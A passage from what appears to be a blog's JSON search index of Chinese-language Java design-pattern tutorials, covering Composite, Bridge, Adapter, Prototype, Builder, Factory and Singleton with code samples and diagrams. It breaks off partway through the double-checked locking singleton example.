输出&lt;i&gt;&lt;b&gt;&lt;span&gt;World&lt;/span&gt;&lt;/b&gt;&lt;/i&gt;","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"组合模式","slug":"组合模式","date":"2020-06-08T22:39:48.000Z","updated":"2021-04-11T17:11:28.990Z","comments":true,"path":"combination-mode/","link":"","permalink":"https://kayleh.top/combination-mode/","excerpt":"组合模式 将对象组合成树形结构以表示“部分-整体”的层次结构，使得用户对单个对象和组合对象的使用具有一致性。","text":"组合模式 将对象组合成树形结构以表示“部分-整体”的层次结构，使得用户对单个对象和组合对象的使用具有一致性。 组合模式（Composite）经常用于树形结构，为了简化代码，使用Composite可以把一个叶子节点与一个父节点统一起来处理。 我们来看一个具体的例子。在XML或HTML中，从根节点开始，每个节点都可能包含任意个其他节点，这些层层嵌套的节点就构成了一颗树。 要以树的结构表示XML，我们可以先抽象出节点类型Node： 12345678public interface Node &#123; // 添加一个节点为子节点: Node add(Node node); // 获取子节点: List&lt;Node&gt; children(); // 输出为XML: String toXml();&#125; 对于一个这样的节点，我们称之为 ElementNode，它可以作为容器包含多个子节点： 123456789101112131415161718192021222324252627public class ElementNode implements Node &#123; private String name; private List&lt;Node&gt; list = new ArrayList&lt;&gt;(); public ElementNode(String name) &#123; this.name = name; &#125; public Node add(Node node) &#123; list.add(node); return this; &#125; public List&lt;Node&gt; children() &#123; return list; &#125; public String toXml() &#123; String start = \"&lt;\" + name + \"&gt;\\n\"; String end = \"&lt;/\" + name + \"&gt;\\n\"; StringJoiner sj = new StringJoiner(\"\", start, end); list.forEach(node -&gt; &#123; sj.add(node.toXml() + \"\\n\"); &#125;); return sj.toString(); &#125;&#125; 对于普通文本，我们把它看作TextNode，它没有子节点： 12345678910111213141516171819public class TextNode implements Node &#123; private String text; public TextNode(String text) &#123; this.text = text; &#125; public Node add(Node node) &#123; throw new UnsupportedOperationException(); &#125; public List&lt;Node&gt; children() &#123; return List.of(); &#125; public String toXml() &#123; return text; &#125;&#125; 此外，还可以有注释节点： 12345678910111213141516171819public class CommentNode implements Node &#123; private String text; public CommentNode(String text) &#123; this.text = text; &#125; public Node add(Node node) &#123; throw new UnsupportedOperationException(); &#125; public List&lt;Node&gt; children() &#123; return List.of(); &#125; public String toXml() &#123; return \"&lt;!-- \" + text + \" --&gt;\"; &#125;&#125; 通过ElementNode、TextNode和CommentNode，我们就可以构造出一颗树： 123456789Node root = new ElementNode(\"school\");root.add(new ElementNode(\"classA\") .add(new TextNode(\"Tom\")) .add(new TextNode(\"Alice\")));root.add(new ElementNode(\"classB\") .add(new TextNode(\"Bob\")) .add(new TextNode(\"Grace\")) .add(new CommentNode(\"comment...\")));System.out.println(root.toXml()); 最后通过root节点输出的XML如下： 1234567891011&lt;school&gt;&lt;classA&gt;TomAlice&lt;/classA&gt;&lt;classB&gt;BobGrace&lt;!-- comment... --&gt;&lt;/classB&gt;&lt;/school&gt; 可见，使用Composite模式时，需要先统一单个节点以及“容器”节点的接口： 123456789 ┌───────────┐ │ Node │ └───────────┘ ▲ ┌────────────┼────────────┐ │ │ │┌───────────┐┌───────────┐┌───────────┐│ElementNode││ TextNode ││CommentNode│└───────────┘└───────────┘└───────────┘ 作为容器节点的ElementNode又可以添加任意个Node，这样就可以构成层级结构。 类似的，像文件夹和文件、GUI窗口的各种组件，都符合Composite模式的定义，因为它们的结构天生就是层级结构。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"桥接模式","slug":"桥接模式","date":"2020-06-08T22:04:02.000Z","updated":"2021-04-11T17:11:28.931Z","comments":true,"path":"bridge-mode/","link":"","permalink":"https://kayleh.top/bridge-mode/","excerpt":"桥接模式 将抽象部分与它的实现部分分离，使它们都可以独立地变化。","text":"桥接模式 将抽象部分与它的实现部分分离，使它们都可以独立地变化。 假设某个汽车厂商生产三种品牌的汽车：Big、Tiny和Boss，每种品牌又可以选择燃油、纯电和混合动力。如果用传统的继承来表示各个最终车型，一共有3个抽象类加9个最终子类： 1234567891011121314151617181920 ┌───────┐ │ Car │ └───────┘ ▲ ┌──────────────────┼───────────────────┐ │ │ │┌───────┐ ┌───────┐ ┌───────┐│BigCar │ │TinyCar│ │BossCar│└───────┘ └───────┘ └───────┘ ▲ ▲ ▲ │ │ │ │ ┌───────────────┐│ ┌───────────────┐│ ┌───────────────┐ ├─│ BigFuelCar │├─│ TinyFuelCar │├─│ BossFuelCar │ │ └───────────────┘│ └───────────────┘│ └───────────────┘ │ ┌───────────────┐│ ┌───────────────┐│ ┌───────────────┐ ├─│BigElectricCar │├─│TinyElectricCar│├─│BossElectricCar│ │ └───────────────┘│ └───────────────┘│ └───────────────┘ │ ┌───────────────┐│ ┌───────────────┐│ ┌───────────────┐ └─│ BigHybridCar │└─│ TinyHybridCar │└─│ BossHybridCar │ └───────────────┘ └───────────────┘ └───────────────┘ 如果要新增一个品牌，或者加一个新的引擎（比如核动力），那么子类的数量增长更快。 所以，桥接模式就是为了避免直接继承带来的子类爆炸。 我们来看看桥接模式如何解决上述问题。 在桥接模式中，首先把Car按品牌进行子类化，但是，每个品牌选择什么发动机，不再使用子类扩充，而是通过一个抽象的“修正”类，以组合的形式引入。我们来看看具体的实现。 首先定义抽象类Car，它引用一个Engine： 12345678910public abstract class Car &#123; // 引用Engine: protected Engine engine; public Car(Engine engine) &#123; this.engine = engine; &#125; public abstract void drive();&#125; Engine的定义如下： 123public interface Engine &#123; void start();&#125; 紧接着，在一个“修正”的抽象类RefinedCar中定义一些额外操作： 123456789101112public abstract class RefinedCar extends Car &#123; public RefinedCar(Engine engine) &#123; super(engine); &#125; public void drive() &#123; this.engine.start(); System.out.println(\"Drive \" + getBrand() + \" car...\"); &#125; public abstract String getBrand();&#125; 这样一来，最终的不同品牌继承自RefinedCar，例如BossCar： 123456789public class BossCar extends RefinedCar &#123; public BossCar(Engine engine) &#123; super(engine); &#125; public String getBrand() &#123; return \"Boss\"; &#125;&#125; 而针对每一种引擎，继承自Engine，例如HybridEngine： 12345public class HybridEngine implements Engine &#123; public void start() &#123; System.out.println(\"Start Hybrid Engine...\"); &#125;&#125; 客户端通过自己选择一个品牌，再配合一种引擎，得到最终的Car： 12RefinedCar car = new BossCar(new HybridEngine());car.drive(); 使用桥接模式的好处在于，如果要增加一种引擎，只需要针对Engine派生一个新的子类，如果要增加一个品牌，只需要针对RefinedCar派生一个子类，任何RefinedCar的子类都可以和任何一种Engine自由组合，即一辆汽车的两个维度：品牌和引擎都可以独立地变化。 123456789101112131415161718 ┌───────────┐ │ Car │ └───────────┘ ▲ │ ┌───────────┐ ┌─────────┐ │RefinedCar │ ─ ─ ─&gt;│ Engine │ └───────────┘ └─────────┘ ▲ ▲ ┌────────┼────────┐ │ ┌──────────────┐ │ │ │ ├─│ FuelEngine │┌───────┐┌───────┐┌───────┐ │ └──────────────┘│BigCar ││TinyCar││BossCar│ │ ┌──────────────┐└───────┘└───────┘└───────┘ ├─│ElectricEngine│ │ └──────────────┘ │ ┌──────────────┐ └─│ HybridEngine │ └──────────────┘ 桥接模式实现比较复杂，实际应用也非常少，但它提供的设计思想值得借鉴，即不要过度使用继承，而是优先拆分某些部件，使用组合的方式来扩展功能。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"适配器模式","slug":"适配器模式","date":"2020-06-07T22:28:13.000Z","updated":"2021-04-11T17:11:29.068Z","comments":true,"path":"adapter-mode/","link":"","permalink":"https://kayleh.top/adapter-mode/","excerpt":"适配器模式 将一个类的接口转换成客户希望的另外一个接口，使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。","text":"适配器模式 将一个类的接口转换成客户希望的另外一个接口，使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。 适配器模式是Adapter，也称Wrapper，是指如果一个接口需要B接口，但是待传入的对象却是A接口，怎么办？ 我们举个例子。如果去美国，我们随身带的电器是无法直接使用的，因为美国的插座标准和中国不同，所以，我们需要一个适配器： 123456789101112131415public class Task implements Callable&lt;Long&gt; &#123; private long num; public Task(long num) &#123; this.num = num; &#125; public Long call() throws Exception &#123; long r = 0; for (long n = 1; n &lt;= this.num; n++) &#123; r = r + n; &#125; System.out.println(\"Result: \" + r); return r; &#125;&#125; 现在，我们想通过一个线程去执行它： 123Callable&lt;Long&gt; callable = new Task(123450000L);Thread thread = new Thread(callable); // compile error!thread.start(); 发现编译不过！因为Thread接收Runnable接口，但不接收Callable接口，肿么办？ 一个办法是改写Task类，把实现的Callable改为Runnable，但这样做不好，因为Task很可能在其他地方作为Callable被引用，改写Task的接口，会导致其他正常工作的代码无法编译。 另一个办法不用改写Task类，而是用一个Adapter，把这个Callable接口“变成”Runnable接口，这样，就可以正常编译： 123Callable&lt;Long&gt; callable = new Task(123450000L);Thread thread = new Thread(new RunnableAdapter(callable));thread.start(); 这个RunnableAdapter类就是Adapter，它接收一个Callable，输出一个Runnable。怎么实现这个RunnableAdapter呢？我们先看完整的代码： 123456789101112131415161718public class RunnableAdapter implements Runnable &#123; // 引用待转换接口: private Callable&lt;?&gt; callable; public RunnableAdapter(Callable&lt;?&gt; callable) &#123; this.callable = callable; &#125; // 实现指定接口: public void run() &#123; // 将指定接口调用委托给转换接口调用: try &#123; callable.call(); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 编写一个Adapter的步骤如下： 实现目标接口，这里是Runnable； 内部持有一个待转换接口的引用，这里是通过字段持有Callable接口； 在目标接口的实现方法内部，调用待转换接口的方法。 这样一来，Thread就可以接收这个RunnableAdapter，因为它实现了Runnable接口。Thread作为调用方，它会调用RunnableAdapter的run()方法，在这个run()方法内部，又调用了Callable的call()方法，相当于Thread通过一层转换，间接调用了Callable的call()方法。 适配器模式在Java标准库中有广泛应用。比如我们持有数据类型是String[]，但是需要List接口时，可以用一个Adapter： 12String[] exist = new String[] &#123;\"Good\", \"morning\", \"Bob\", \"and\", \"Alice\"&#125;;Set&lt;String&gt; set = new HashSet&lt;&gt;(Arrays.asList(exist)); 注意到List Arrays.asList(T[])就相当于一个转换器，它可以把数组转换为List。 我们再看一个例子：假设我们持有一个InputStream，希望调用readText(Reader)方法，但它的参数类型是Reader而不是InputStream，怎么办？ 当然是使用适配器，把InputStream“变成”Reader： 123InputStream input = Files.newInputStream(Paths.get(\"/path/to/file\"));Reader reader = new InputStreamReader(input, \"UTF-8\");readText(reader); InputStreamReader就是Java标准库提供的Adapter，它负责把一个InputStream适配为Reader。类似的还有OutputStreamWriter。 如果我们把readText(Reader)方法参数从Reader改为FileReader，会有什么问题？这个时候，因为我们需要一个FileReader类型，就必须把InputStream适配为FileReader： 1FileReader reader = new InputStreamReader(input, \"UTF-8\"); // compile error! 直接使用InputStreamReader这个Adapter是不行的，因为它只能转换出Reader接口。事实上，要把InputStream转换为FileReader也不是不可能，但需要花费十倍以上的功夫。这时，面向抽象编程这一原则就体现出了威力：持有高层接口不但代码更灵活，而且把各种接口组合起来也更容易。一旦持有某个具体的子类类型，要想做一些改动就非常困难。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"原型","slug":"原型","date":"2020-06-07T17:43:14.000Z","updated":"2021-04-11T17:11:28.788Z","comments":true,"path":"prototype/","link":"","permalink":"https://kayleh.top/prototype/","excerpt":"原型 用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。","text":"原型 用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。 原型模式，即Prototype，是指创建新对象的时候，根据现有的一个原型来创建。 我们举个例子：如果我们已经有了一个String[]数组，想再创建一个一模一样的String[]数组，怎么写？ 实际上创建过程很简单，就是把现有数组的元素复制到新数组。如果我们把这个创建过程封装一下，就成了原型模式。用代码实现如下： 1234// 原型:String[] original = &#123; \"Apple\", \"Pear\", \"Banana\" &#125;;// 新对象:String[] copy = Arrays.copyOf(original, original.length); 对于普通类，我们如何实现原型拷贝？Java的Object提供了一个clone()方法，它的意图就是复制一个新的对象出来，我们需要实现一个Cloneable接口来标识一个对象是“可复制”的： 1234567891011121314public class Employee implements Cloneable &#123; private int id; private String name; private int score; // 复制新对象并返回: public Object clone() &#123; Employee employee = new Employee(); employee.id = this.id; employee.name = this.name; employee.score = this.score; return employee; &#125;&#125; 使用的时候，因为clone()的方法签名是定义在Object中，返回类型也是Object，所以要强制转型，比较麻烦： 123456789Employee employee = new Employee();employee.setId(123);employee.setName(\"Bob\");employee.setScore(88);// 复制新对象:Employee employee2 = (Employee) employee.clone();System.out.println(employee);System.out.println(employee2);System.out.println(employee == employee2); // false 实际上，使用原型模式更好的方式是定义一个copy()方法，返回明确的类型： 12345678910111213public class Employee &#123; private int id; private String name; private int score; public Employee copy() &#123; Student employee = new Employee(); employee.id = this.id; employee.name = this.name; employee.score = this.score; return employee; &#125;&#125; 原型模式应用不是很广泛，因为很多实例会持有类似文件、Socket这样的资源，而这些资源是无法复制给另一个对象共享的，只有存储简单类型的“值”对象可以复制。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"生成器","slug":"生成器","date":"2020-06-07T17:39:43.000Z","updated":"2021-04-11T17:11:28.975Z","comments":true,"path":"builder/","link":"","permalink":"https://kayleh.top/builder/","excerpt":"生成器 将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。","text":"生成器 将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。 生成器模式（Builder）是使用多个“小型”工厂来最终创建出一个完整对象。 当我们使用Builder的时候，一般来说，是因为创建这个对象的步骤比较多，每个步骤都需要一个零部件，最终组合成一个完整的对象。 使用Builder模式时，适用于创建的对象比较复杂，最好一步一步创建出“零件”，最后再装配起来。JavaMail的MimeMessage就可以看作是一个Builder模式，只不过Builder和最终产品合二为一，都是MimeMessage： 1234567891011121314151617181920Multipart multipart &#x3D; new MimeMultipart();&#x2F;&#x2F; 添加text:BodyPart textpart &#x3D; new MimeBodyPart();textpart.setContent(body, &quot;text&#x2F;html;charset&#x3D;utf-8&quot;);multipart.addBodyPart(textpart);&#x2F;&#x2F; 添加image:BodyPart imagepart &#x3D; new MimeBodyPart();imagepart.setFileName(fileName);imagepart.setDataHandler(new DataHandler(new ByteArrayDataSource(input, &quot;application&#x2F;octet-stream&quot;)));multipart.addBodyPart(imagepart);MimeMessage message &#x3D; new MimeMessage(session);&#x2F;&#x2F; 设置发送方地址:message.setFrom(new InternetAddress(&quot;me@example.com&quot;));&#x2F;&#x2F; 设置接收方地址:message.setRecipient(Message.RecipientType.TO, new InternetAddress(&quot;xiaoming@somewhere.com&quot;));&#x2F;&#x2F; 设置邮件主题:message.setSubject(&quot;Hello&quot;, &quot;UTF-8&quot;);&#x2F;&#x2F; 设置邮件内容为multipart:message.setContent(multipart); 很多时候，我们可以简化Builder模式，以链式调用的方式来创建对象。例如，我们经常编写这样的代码：123456StringBuilder builder &#x3D; new StringBuilder();builder.append(secure ? &quot;https:&#x2F;&#x2F;&quot; : &quot;http:&#x2F;&#x2F;&quot;) .append(&quot;www.liaoxuefeng.com&quot;) .append(&quot;&#x2F;&quot;) .append(&quot;?t&#x3D;0&quot;);String url &#x3D; builder.toString(); 由于我们经常需要构造URL字符串，可以使用Builder模式编写一个URLBuilder，调用方式如下：123456String url &#x3D; URLBuilder.builder() &#x2F;&#x2F; 创建Builder .setDomain(&quot;www.liaoxuefeng.com&quot;) &#x2F;&#x2F; 设置domain .setScheme(&quot;https&quot;) &#x2F;&#x2F; 设置scheme .setPath(&quot;&#x2F;&quot;) &#x2F;&#x2F; 设置路径 .setQuery(Map.of(&quot;a&quot;, &quot;123&quot;, &quot;q&quot;, &quot;K&amp;R&quot;)) &#x2F;&#x2F; 设置query .build(); &#x2F;&#x2F; 完成build","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"工厂设计模式","slug":"工厂设计模式","date":"2020-06-06T04:42:10.000Z","updated":"2021-04-11T17:11:28.855Z","comments":true,"path":"factory-design-pattern/","link":"","permalink":"https://kayleh.top/factory-design-pattern/","excerpt":"工厂设计模式工厂方法工厂方法即Factory Method，是一种对象创建型模式。","text":"工厂设计模式工厂方法工厂方法即Factory Method，是一种对象创建型模式。 工厂方法的目的是使得创建对象和使用对象是分离的，并且客户端总是引用抽象工厂和抽象产品： 12345678┌─────────────┐ ┌─────────────┐│ Product │ │ Factory │└─────────────┘ └─────────────┘ ▲ ▲ │ │┌─────────────┐ ┌─────────────┐│ ProductImpl │&lt;─ ─ ─│ FactoryImpl │└─────────────┘ └─────────────┘ 例如实现一个解析字符串到Number的Factory，可以定义如下： 12345public class NumberFactoryImpl implements NumberFactory &#123; public Number parse(String s) &#123; return new BigDecimal(s); &#125;&#125; 而产品接口是Number，NumberFactoryImpl返回的实际产品是BigDecimal。 那么客户端如何创建NumberFactoryImpl呢？通常我们会在接口Factory中定义一个静态方法getFactory()来返回真正的子类： 123456789public interface NumberFactory &#123; // 创建方法: Number parse(String s); // 获取工厂实例: static NumberFactory getFactory() &#123; return impl; &#125; static NumberFactory impl = new NumberFactoryImpl();&#125; 在客户端中，我们只需要和工厂接口NumberFactory以及抽象产品Number打交道： 12NumberFactory factory = NumberFactory.getFactory();Number result = factory.parse(\"123.456\"); 调用方可以完全忽略真正的工厂NumberFactoryImpl和实际的产品BigDecimal，这样做的好处是允许创建产品的代码独立地变换，而不会影响到调用方。 实际上大多数情况下我们并不需要抽象工厂，而是通过静态方法直接返回产品，即： 12345public class NumberFactory &#123; public static Number parse(String s) &#123; return new BigDecimal(s); &#125;&#125; 这种简化的使用静态方法创建产品的方式称为静态工厂方法（Static Factory Method）。静态工厂方法广泛地应用在Java标准库中。例如： 1Integer n = Integer.valueOf(100); Integer既是产品又是静态工厂。它提供了静态方法valueOf()来创建Integer。那么这种方式和直接写new Integer(100)有何区别呢？我们观察valueOf()方法： 12345678public final class Integer &#123; public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); &#125; ...&#125; 它的好处在于，valueOf()内部可能会使用new创建一个新的Integer实例，但也可能直接返回一个缓存的Integer实例。对于调用方来说，没必要知道Integer创建的细节。 工厂方法可以隐藏创建产品的细节，且不一定每次都会真正创建产品，完全可以返回缓存的产品，从而提升速度并减少内存消耗。 如果调用方直接使用Integer n = new Integer(100)，那么就失去了使用缓存优化的可能性。 我们经常使用的另一个静态工厂方法是List.of()： 1List&lt;String&gt; list = List.of(\"A\", \"B\", \"C\"); 这个静态工厂方法接收可变参数，然后返回List接口。需要注意的是，调用方获取的产品总是List接口，而且并不关心它的实际类型。即使调用方知道List产品的实际类型是java.util.ImmutableCollections$ListN，也不要去强制转型为子类，因为静态工厂方法List.of()保证返回List，但也完全可以修改为返回java.util.ArrayList。这就是里氏替换原则：返回实现接口的任意子类都可以满足该方法的要求，且不影响调用方。 总是引用接口而非实现类，能允许变换子类而不影响调用方，即尽可能面向抽象编程。 和List.of()类似，我们使用MessageDigest时，为了创建某个摘要算法，总是使用静态工厂方法getInstance(String)： 12MessageDigest md5 = MessageDigest.getInstance(\"MD5\");MessageDigest sha1 = MessageDigest.getInstance(\"SHA-1\"); 调用方通过产品名称获得产品实例，不但调用简单，而且获得的引用仍然是MessageDigest这个抽象类。 抽象工厂 提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。 抽象工厂模式（Abstract Factory）是一个比较复杂的创建型模式。 抽象工厂模式和工厂方法不太一样，它要解决的问题比较复杂，不但工厂是抽象的，产品是抽象的，而且有多个产品需要创建，因此，这个抽象工厂会对应到多个实际工厂，每个实际工厂负责创建多个实际产品： 1234567891011121314151617 ┌────────┐ ─ &gt;│ProductA│┌────────┐ ┌─────────┐ │ └────────┘│ Client │─ ─&gt;│ Factory │─ ─└────────┘ └─────────┘ │ ┌────────┐ ▲ ─ &gt;│ProductB│ ┌───────┴───────┐ └────────┘ │ │ ┌─────────┐ ┌─────────┐ │Factory1 │ │Factory2 │ └─────────┘ └─────────┘ │ ┌─────────┐ │ ┌─────────┐ ─ &gt;│ProductA1│ ─ &gt;│ProductA2│ │ └─────────┘ │ └─────────┘ ┌─────────┐ ┌─────────┐ └ ─&gt;│ProductB1│ └ ─&gt;│ProductB2│ └─────────┘ └─────────┘ 这种模式有点类似于多个供应商负责提供一系列类型的产品。我们举个例子： 假设我们希望为用户提供一个Markdown文本转换为HTML和Word的服务，它的接口定义如下： 123456public interface AbstractFactory &#123; // 创建Html文档: HtmlDocument createHtml(String md); // 创建Word文档: WordDocument createWord(String md);&#125; 注意到上面的抽象工厂仅仅是一个接口，没有任何代码。同样的，因为HtmlDocument和WordDocument都比较复杂，现在我们并不知道如何实现它们，所以只有接口： 12345678910// Html文档接口:public interface HtmlDocument &#123; String toHtml(); void save(Path path) throws IOException;&#125;// Word文档接口:public interface WordDocument &#123; void save(Path path) throws IOException;&#125; 这样，我们就定义好了抽象工厂（AbstractFactory）以及两个抽象产品（HtmlDocument和WordDocument）。因为实现它们比较困难，我们决定让供应商来完成。 现在市场上有两家供应商：FastDoc Soft的产品便宜，并且转换速度快，而GoodDoc Soft的产品贵，但转换效果好。我们决定同时使用这两家供应商的产品，以便给免费用户和付费用户提供不同的服务。 我们先看看FastDoc Soft的产品是如何实现的。首先，FastDoc Soft必须要有实际的产品，即FastHtmlDocument和FastWordDocument： 1234567891011121314public class FastHtmlDocument implements HtmlDocument &#123; public String toHtml() &#123; ... &#125; public void save(Path path) throws IOException &#123; ... &#125;&#125;public class FastWordDocument implements WordDocument &#123; public void save(Path path) throws IOException &#123; ... &#125;&#125; 然后，FastDoc Soft必须提供一个实际的工厂来生产这两种产品，即FastFactory： 12345678public class FastFactory implements AbstractFactory &#123; public HtmlDocument createHtml(String md) &#123; return new FastHtmlDocument(md); &#125; public WordDocument createWord(String md) &#123; return new FastWordDocument(md); &#125;&#125; 这样，我们就可以使用FastDoc Soft的服务了。客户端编写代码如下： 12345678// 创建AbstractFactory，实际类型是FastFactory:AbstractFactory factory = new FastFactory();// 生成Html文档:HtmlDocument html = factory.createHtml(\"#Hello\\nHello, world!\");html.save(Paths.get(\".\", \"fast.html\"));// 生成Word文档:WordDocument word = fastFactory.createWord(\"#Hello\\nHello, world!\");word.save(Paths.get(\".\", \"fast.doc\")); 如果我们要同时使用GoodDoc Soft的服务怎么办？因为用了抽象工厂模式，GoodDoc Soft只需要根据我们定义的抽象工厂和抽象产品接口，实现自己的实际工厂和实际产品即可： 123456789101112131415161718// 实际工厂:public class GoodFactory implements AbstractFactory &#123; public HtmlDocument createHtml(String md) &#123; return new GoodHtmlDocument(md); &#125; public WordDocument createWord(String md) &#123; return new GoodWordDocument(md); &#125;&#125;// 实际产品:public class GoodHtmlDocument implements HtmlDocument &#123; ...&#125;public class GoodWordDocument implements HtmlDocument &#123; ...&#125; 客户端要使用GoodDoc Soft的服务，只需要把原来的new FastFactory()切换为new GoodFactory()即可。 注意到客户端代码除了通过new创建了FastFactory或GoodFactory外，其余代码只引用了产品接口，并未引用任何实际产品（例如，FastHtmlDocument），如果把创建工厂的代码放到AbstractFactory中，就可以连实际工厂也屏蔽了： 1234567891011public interface AbstractFactory &#123; public static AbstractFactory createFactory(String name) &#123; if (name.equalsIgnoreCase(\"fast\")) &#123; return new FastFactory(); &#125; else if (name.equalsIgnoreCase(\"good\")) &#123; return new GoodFactory(); &#125; else &#123; throw new IllegalArgumentException(\"Invalid factory name\"); &#125; &#125;&#125;","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"单例模式","slug":"单例模式","date":"2020-06-05T22:05:04.000Z","updated":"2021-04-11T17:11:28.778Z","comments":true,"path":"singleton-mode/","link":"","permalink":"https://kayleh.top/singleton-mode/","excerpt":"单例设计模式","text":"单例设计模式 所谓类的单例设计模式，就是采用一定的方法保证在整个软件系统中，对某个类只能存在一个对象实例，并且该类只提供一个取得对象实例的方法(静态方法)。 比如Hibernate的SessionFactory，它充当数据存储源的代理，并负责创建Session 对象。SessionFactory并不是轻量级的，一般情况下，一个项目通常只需要一个 SessionFactory就够，这是就会使用到单例模式。 单例模式有八种方式： 饿汉式(静态常量) 饿汉式（静态代码块） 懒汉式(线程不安全) 懒汉式(线程安全，同步方法) 懒汉式(线程安全，同步代码块) 双重检查 静态内部类 枚举 饿汉式(静态变量) 123456789101112131415161718192021222324/** * @Author: Wizard * @Date: 2020/6/6 14:13 */public class Singleton1 &#123; public static void main(String[] args) &#123; //Test SingleTon instance1 = SingleTon.getInstance(); SingleTon instance2 = SingleTon.getInstance(); System.out.println(instance1==instance2);//true &#125;&#125;//饿汉式(静态变量)class SingleTon1 &#123; //1.构造器私有化, 外部不能new private SingleTon1() &#123; &#125; //2.在本类内部创建对象实例 private final static SingleTon1 instance = new SingleTon1(); //3.提供一个公有的静态方法，返回实例对象 public static SingleTon1 getInstance() &#123; return instance; &#125;&#125; 优缺点： 优点：这种写法比较简单，就是在类装载的时候就完成实例化。避免了线程同 步问题。 缺点：在类装载的时候就完成实例化，没有达到Lazy Loading的效果。如果从始 至终从未使用过这个实例，则会造成内存的浪费 这种方式基于classloder机制避免了多线程的同步问题，不过，instance在类装载 时就实例化，在单例模式中大多数都是调用getInstance方法， 但是导致类装载 的原因有很多种，因此不能确定有其他的方式（或者其他的静态方法）导致类 装载，这时候初始化instance就没有达到 lazy loading的效果 结论：这种单例模式可用，可能造成内存浪费 饿汉式(静态代码块) 1234567891011121314151617181920212223/** * @Author: Wizard * @Date: 2020/6/6 14:13 *///饿汉式(静态代码块)class SingleTon2 &#123; //1.构造器私有化, 外部不能new private SingleTon2() &#123; &#125; //2.在本类内部创建对象实例 private static SingleTon2 instance; static &#123; //在静态代码块中，创建单例对象,静态代码块只执行一次 instance = new SingleTon2(); &#125; //3.提供一个公有的静态方法，返回实例对象 public static SingleTon2 getInstance() &#123; return instance; &#125;&#125; 优缺点和静态变量相同 懒汉式(线程不安全) 1234567891011121314//懒汉式class SingleTon3 &#123; private static SingleTon3 instance; private SingleTon3() &#123; &#125; //提供一个静态的公有方法,当使用到该方法时，才去创建instance public static SingleTon3 getInstance()&#123; if (instance==null)&#123; instance = new SingleTon3(); &#125; return instance; &#125;&#125; 优缺点： 起到了Lazy Loading的效果，但是只能在单线程下使用。 如果在多线程下，一个线程进入了if (singleton == null)判断语句块，还未来得及 往下执行，另一个线程也通过了这个判断语句，这时便会产生多个实例。所以 在多线程环境下不可使用这种方式 结论：在实际开发中，不要使用这种方式. 懒汉式(线程安全，同步方法) 1234567891011121314//懒汉式(线程安全，同步方法)class SingleTon4 &#123; private static SingleTon4 instance; private SingleTon4() &#123; &#125; //提供一个静态的公有方法,加入同步处理的代码，解决线程安全问题 public static synchronized SingleTon4 getInstance()&#123; if (instance==null)&#123; instance = new SingleTon4(); &#125; return instance; &#125;&#125; 优缺点说明： 解决了线程不安全问题 效率太低了，每个线程在想获得类的实例时候，执行getInstance()方法都要进行 同步。而其实这个方法只执行一次实例化代码就够了，后面的想获得该类实例， 直接return就行了。方法进行同步效率太低 结论：在实际开发中，不推荐使用这种方式 懒汉式(线程安全，同步代码块) 123456789101112131415//懒汉式(线程安全，同步代码块)class SingleTon5 &#123; private static SingleTon5 instance; private SingleTon5() &#123; &#125; //提供一个静态的公有方法,加入同步处理的代码，解决线程安全问题 public static SingleTon5 getInstance() &#123; if (instance == null) &#123; synchronized (SingleTon5.class) &#123; instance = new SingleTon5(); &#125; &#125; return instance; &#125;&#125; 优缺点说明： 这种方式，本意是想对第四种实现方式的改进，因为前面同步方法效率太低， 改为同步产生实例化的的代码块 但是这种同步并不能起到线程同步的作用。跟第3种实现方式遇到的情形一 致，假如一个线程进入了if (singleton == null)判断语句块，还未来得及往下执行， 另一个线程也通过了这个判断语句，这时便会产生多个实例 结论：在实际开发中，不能使用这种方式 双重检查 1234567891011121314151617181920//懒汉式(线程安全,双重检查)class SingleTon6 &#123; //必须加volatile关键字的原因：new对象分为3步:1.分配空间 2.初始化对象 3.指向对象内存地址 // 2和3可能被编译器自动重排序,导致判断非空但是实际拿的对象还未完成初始化 private static volatile SingleTon6 instance; private SingleTon6() &#123; &#125; //提供一个静态的公有方法,加入双重检查代码，解决线程安全问题,同时解决懒加载的问题 public static SingleTon6 getInstance() &#123; if (instance == null) &#123; synchronized (SingleTon6.class) &#123; if (instance == null) &#123; instance = new SingleTon6(); &#125; &#125; &#125; return instance; 